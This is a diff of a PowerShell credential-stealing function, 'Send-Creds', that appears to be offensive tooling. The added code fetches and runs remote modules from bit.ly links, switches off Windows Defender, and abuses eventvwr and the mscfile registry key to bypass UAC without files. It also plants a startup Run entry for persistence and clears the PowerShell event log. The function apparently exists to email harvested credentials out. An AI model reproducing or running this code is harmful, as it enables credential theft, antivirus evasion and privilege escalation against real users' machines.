@@ -15,10 +15,6 @@ Function Send-Creds {
 		$To
 	)
 	$Command = "
-		# Import module to Enable/Disable WindowsDefender
-		Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2ejyXkA')
-		# Disable WindowsDefender
-		Set-WindowsDefender -Mode Disabled
 		# Import Send-Email module
 		Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2duH9Yu')
 		
@@ -42,24 +38,70 @@ Function Send-Creds {
 		
 		# Clear EventLog
 		Clear-EventLog -LogName 'Windows PowerShell'
-		# Enable Windows Defender
-		Set-WindowsDefender -Mode Enabled
 	"
+	
+	Function Invoke-MsMpEngBypass ($Command) {
+		#######################################################################################################################
+		### Antimalware service detected
+		
+		# Import module to Enable/Disable WindowsDefender
+		Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2ejyXkA')
+		# Disable WindowsDefender
+		Set-WindowsDefender -Mode Disabled
+		
+		$Path = 'HKCU:\Software\Microsoft\Powershell'
+		$mscCommandPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
+		$RunPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+		
+		$Command += "
+		## Clean Up ##
+		
+		Remove-ItemProperty -Path '$Path' -Name 'Command' -Force -ErrorAction SilentlyContinue
+		Remove-ItemProperty -Path '$mscCommandPath' -Name '(Default)' -Force -ErrorAction SilentlyContinue
+		Remove-ItemProperty -Path '$RunPath' -Name 'eventvwr' -Force -ErrorAction SilentlyContinue
+		
+		# Import module to Enable/Disable WindowsDefender
+		Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2ejyXkA')
+		
+		# Enable WindowsDefender
+		Set-WindowsDefender -Mode Enabled
+		"
+		
+		# Save command in the register
+		Remove-ItemProperty -Path $Path -Name 'Command' -Force -ErrorAction SilentlyContinue
+		New-ItemProperty -Path $Path -Name 'Command' -Value $Command -PropertyType string -Force | Out-Null
+		
+		# Save launcher of the command
+		Remove-ItemProperty -Path $mscCommandPath -Name '(Default)' -Force -ErrorAction SilentlyContinue
+		New-ItemProperty -Path $mscCommandPath -Name '(Default)' -Value 'Powershell Invoke-Expression (Get-ItemProperty -Path HKCU:\Software\Microsoft\Powershell).Command' -PropertyType string -Force | Out-Null
+		
+		# Add eventvwr to run at the start up
+		Remove-ItemProperty -Path $RunPath -Name 'eventvwr' -Force -ErrorAction SilentlyContinue
+		New-ItemProperty -Path $RunPath -Name 'eventvwr' -Value (Join-Path -Path ([Environment]::GetFolderPath('System')) -ChildPath 'eventvwr.exe') -PropertyType string -Force | Out-Null
+	}
 	
 	# Test Admin
 	if ((New-Object Security.Principal.WindowsPrincipal ([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
-		Invoke-Expression $Command
+		if (Get-Process -Name MsMpEng -ErrorAction SilentlyContinue) {
+			Invoke-MsMpEngBypass $Command
+		} else {
+			Invoke-Expression $Command
+		}
 	} else {
-		## Fileless bypass uac
-		# Import EventVwrBypass module
-		Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2bKS5oM')
-		# Save command in the register
-		$Path = 'HKCU:\Software\Microsoft\Powershell'
-		Remove-ItemProperty -Path $Path -Name 'Command' -Force -ErrorAction SilentlyContinue
-		New-ItemProperty -Path $Path -Name 'Command' -Value $Command -PropertyType string -Force | Out-Null
-		# Execute bypass w/encoded command
-		Invoke-EventVwrBypass -Command 'Powershell -WindowStyle Hidden Invoke-Expression (Get-ItemProperty -Path HKCU:\Software\Microsoft\Powershell).Command' -Force
-		# Remove command from the register
-		Remove-ItemProperty -Path $Path -Name 'Command' -Force
+		if (Get-Process -Name MsMpEng -ErrorAction SilentlyContinue) {
+			Invoke-MsMpEngBypass $Command
+		} else {
+			## Fileless bypass uac
+			# Import EventVwrBypass module
+			Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2bKS5oM')
+			# Save command in the register
+			$Path = 'HKCU:\Software\Microsoft\Powershell'
+			Remove-ItemProperty -Path $Path -Name 'Command' -Force -ErrorAction SilentlyContinue
+			New-ItemProperty -Path $Path -Name 'Command' -Value $Command -PropertyType string -Force | Out-Null
+			# Execute bypass w/encoded command
+			Invoke-EventVwrBypass -Command 'Powershell Invoke-Expression (Get-ItemProperty -Path HKCU:\Software\Microsoft\Powershell).Command' -Force
+			# Remove command from the register
+			Remove-ItemProperty -Path $Path -Name 'Command' -Force
+		}
 	}
 }
